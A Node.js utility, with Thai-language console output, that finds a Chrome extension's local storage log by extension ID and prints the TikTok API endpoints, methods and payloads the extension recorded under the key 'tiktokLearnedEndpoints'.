const fs = require('fs');
const path = require('path');

// ─── Auto-detect Chrome Extension Local Storage Directory (supports OS auto-detection & custom overrides) ───
function resolveDbDir() {
  const argv = process.argv;
  const args = {};
  for (let i = 2; i < argv.length; i += 1) {
    if (argv[i].startsWith("--")) {
      const key = argv[i].slice(2);
      const next = argv[i + 1];
      if (next && !next.startsWith("--")) {
        args[key] = next;
        i += 1;
      } else {
        args[key] = true;
      }
    }
  }

  if (args.dir) {
    return path.resolve(args.dir);
  }
  if (process.env.EXTENSION_DIR) {
    return path.resolve(process.env.EXTENSION_DIR);
  }

  const extensionId = args.id || process.env.EXTENSION_ID || 'gghniflcfbkadcmmbcciaoofifpfinbd';
  let chromeBase = '';

  if (process.platform === 'win32') {
    chromeBase = path.join(process.env.LOCALAPPDATA || '', 'Google/Chrome/User Data');
  } else if (process.platform === 'darwin') {
    chromeBase = path.join(process.env.HOME || '', 'Library/Application Support/Google/Chrome');
  } else {
    chromeBase = path.join(process.env.HOME || '', '.config/google-chrome');
  }

  const profiles = ['Default', 'Profile 1', 'Profile 2', 'Profile 3', 'Profile 4', 'Profile 5'];
  for (const profile of profiles) {
    const candidate = path.join(chromeBase, profile, 'Local Extension Settings', extensionId);
    if (fs.existsSync(candidate)) {
      return candidate;
    }
  }

  return path.join(chromeBase, 'Default', 'Local Extension Settings', extensionId);
}

const dbDir = resolveDbDir();
let logFilePath = '';

try {
  const files = fs.readdirSync(dbDir);
  const logFiles = files.filter(f => f.endsWith('.log'));
  if (logFiles.length === 0) {
    console.error('❌ ไม่พบไฟล์ Log ในโฟลเดอร์');
    process.exit(1);
  }
  
  const latestLog = logFiles.map(f => ({
    name: f,
    time: fs.statSync(path.join(dbDir, f)).mtime.getTime()
  })).sort((a, b) => b.time - a.time)[0].name;

  logFilePath = path.join(dbDir, latestLog);
  console.log('ใช้ไฟล์ Log ล่าสุด:', logFilePath);
} catch (e) {
  console.error('Error finding log file:', e.message);
  process.exit(1);
}

try {
  const content = fs.readFileSync(logFilePath).toString('binary');
  const searchKey = 'tiktokLearnedEndpoints';
  let index = 0;
  let lastMatch = -1;

  while ((index = content.indexOf(searchKey, index)) !== -1) {
    lastMatch = index;
    index += searchKey.length;
  }

  if (lastMatch === -1) {
    console.log('❌ ไม่พบข้อมูลใน Log File');
    process.exit(0);
  }

  const substring = content.substr(lastMatch, 10 * 1024 * 1024); // 10 MB
  const braceStart = substring.indexOf('{');
  if (braceStart !== -1) {
    let openBraces = 0;
    let braceEnd = -1;
    for (let j = braceStart; j < substring.length; j++) {
      if (substring[j] === '{') openBraces++;
      if (substring[j] === '}') {
        openBraces--;
        if (openBraces === 0) { braceEnd = j; break; }
      }
    }

    if (braceEnd !== -1) {
      const jsonStr = substring.substring(braceStart, braceEnd + 1).replace(/[^\x20-\x7E\t\r\n]/g, '');
      try {
        const parsed = JSON.parse(jsonStr);
        console.log('====================================================');
        console.log('🔍 วิเคราะห์ Payloads & URL ของ API ที่ดักจับได้ล่าสุด:');
        console.log('====================================================');
        for (const [path, data] of Object.entries(parsed)) {
          console.log(`\nEndpoint Path: ${path}`);
          console.log(`URL: ${data.url}`);
          console.log(`Method: ${data.method}`);
          console.log(`Post Data (Payload):`, data.postData || 'ไม่มีข้อมูล Payload');
          console.log(`Response Metadata/Message:`, data.sampleResponse?.message || data.sampleResponse?.ResponseMetadata?.Action || 'ไม่มีข้อความตอบกลับ');
        }
      } catch (err) {
        console.error('JSON Parse Error:', err.message);
        console.log('Raw sample:', jsonStr.slice(0, 1000));
      }
    }
  }
} catch (e) {
  console.error('Error:', e.message);
}
